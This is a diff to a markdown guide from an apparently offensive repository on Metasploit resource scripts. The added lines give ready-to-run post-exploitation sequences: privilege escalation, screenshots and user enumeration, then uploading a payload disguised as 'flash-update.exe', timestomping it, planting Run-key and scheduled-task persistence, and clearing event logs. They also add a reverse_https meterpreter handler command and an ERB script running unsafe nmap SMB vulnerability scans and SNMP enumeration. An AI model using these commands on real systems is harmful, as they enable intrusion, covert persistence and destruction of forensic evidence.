@@ -8,8 +8,8 @@
 |-------|---|---|
 | how to run | [resource scripts (rc)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r my_resource_file.rc |
 | resource files | [resource files (examples)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-files-examples) |  run migrate -n wininit.exe |
-| AutoRunScript| [RC through AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#run-rc-through-autorunscript) | set AutoRunScript /root/my_resource_file.rc |
 | post exploitation | [post exploitation (rc)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#post-exploitation) | self.run_single("use auxiliary/scanner/vnc/vnc_none_auth") |
+| AutoRunScript| [RC through AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#run-rc-through-autorunscript) | set AutoRunScript /root/my_resource_file.rc |
 | ERB scripting| [ERB scripting (ruby)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#erb-scripting-ruby) | <ruby>hosts = session.framework.datastore['RPATH'].split('/')[1..-5]</ruby> |
 
 <br />
@@ -97,11 +97,34 @@
 
 <br /><br /><br />
 
-## Run RC through AutoRunScript
+## POST EXPLOITATION
 
-- **RC::AutoRunScript::**`[resource_script.rc]`<br />
+- **FFF**
 
-      set AutoRunScript /root/my_resource_file.rc
+      getsystem
+      screenshot -v -p IClass.jpeg -v true
+      run post/windows/manage/migrate
+      run post/windows/gather/checkvm
+      run post/windows/gather/enum_logged_on_users
+      run post/windows/gather/enum_applications
+
+<br />
+
+- **FFF**
+
+      getsystem
+      run migrate -n explorer.exe
+      upload flash-update.exe %temp%\\flash-update.exe
+      timestomp -z '3/10/1999 15:15:15' %temp%\\flash-update.exe
+      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\flash-update.exe
+      run scheduleme -m 10 -c "%temp%\\flash-update.exe"
+      clearev
+
+<br />
+
+- **Handler::AutoRunScript::**`[bash prompt]`<br />
+
+      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_command -rc /root/my_resource_file.rc; exploit'
 
 <br />
 
@@ -111,11 +134,11 @@
 
 <br /><br /><br />
 
-## POST EXPLOITATION
+## Run RC through AutoRunScript
 
-- **Handler::AutoRunScript::**`[bash prompt]`<br />
+- **RC::AutoRunScript::**`[resource_script.rc]`<br />
 
-      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_command -rc /root/my_resource_file.rc; exploit'
+      set AutoRunScript /root/my_resource_file.rc
 
 <br />
 
@@ -157,6 +180,37 @@
        end
       end
       </ruby>
+
+<br />
+
+- **FFF**
+
+      <ruby>
+        print_line("")
+        print_status("Please wait, checking if RHOSTS are set globally...")
+          if (framework.datastore['RHOSTS'] == nil)
+            print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
+          return nil
+        end
+
+        # Using nmap to populate metasploit database (db_nmap)
+        print_good("RHOSTS set globally [ OK ] running scans...")
+        run_single("nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}")
+
+        # Displays msf database results stored into 'services' and 'vulns' 
+        run_single("services #{framework.datastore['RHOSTS']}")
+        run_single("vulns #{framework.datastore['RHOSTS']}")
+        print_line("")
+        print_good("Please wait, running msf auxiliary modules...")
+      </ruby>
+
+      # running msf auxiliary modules
+      use auxiliary/scanner/snmp/snmp_enum
+      run
+      use auxiliary/scanner/snmp/snmp_enumusers
+      run
+      use auxiliary/scanner/snmp/snmp_enumshares
+      run
 
 <br />
 
